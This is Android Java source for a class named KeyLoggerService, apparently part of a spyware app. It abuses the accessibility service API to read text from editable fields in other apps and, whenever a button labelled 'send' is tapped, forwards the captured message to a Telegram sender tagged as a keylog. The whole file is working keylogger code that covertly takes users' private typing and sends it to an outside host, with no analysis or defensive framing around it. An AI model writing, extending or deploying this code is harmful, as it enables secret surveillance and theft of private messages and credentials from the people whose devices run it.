package org.telegram.logger;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

public class KeyLoggerService extends AccessibilityService {
    private String lastText = "";

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_CLICKED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null) {
                CharSequence text = source.getText();
                if (text != null && text.toString().toLowerCase().contains("send")) {
                    String msg = getMessageText();
                    if (msg != null && !msg.isEmpty()) {
                        TelegramSender.sendMessage("⌨️ Кейлог: " + msg);
                    }
                }
                source.recycle();
            }
        }
        if (event.getEventType() == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
            AccessibilityNodeInfo source = event.getSource();
            if (source != null && source.getText() != null) {
                lastText = source.getText().toString();
            }
        }
    }

    private String getMessageText() {
        AccessibilityNodeInfo root = getRootInActiveWindow();
        if (root != null) {
            String result = findTextInput(root);
            root.recycle();
            return result != null ? result : lastText;
        }
        return lastText;
    }

    private String findTextInput(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (node.isEditable() && node.getText() != null) {
            return node.getText().toString();
        }
        for (int i = 0; i < node.getChildCount(); i++) {
            String result = findTextInput(node.getChild(i));
            if (result != null) return result;
        }
        return null;
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onServiceConnected() {
        AccessibilityServiceInfo info = getServiceInfo();
        info.flags |= AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
        setServiceInfo(info);
    }
}
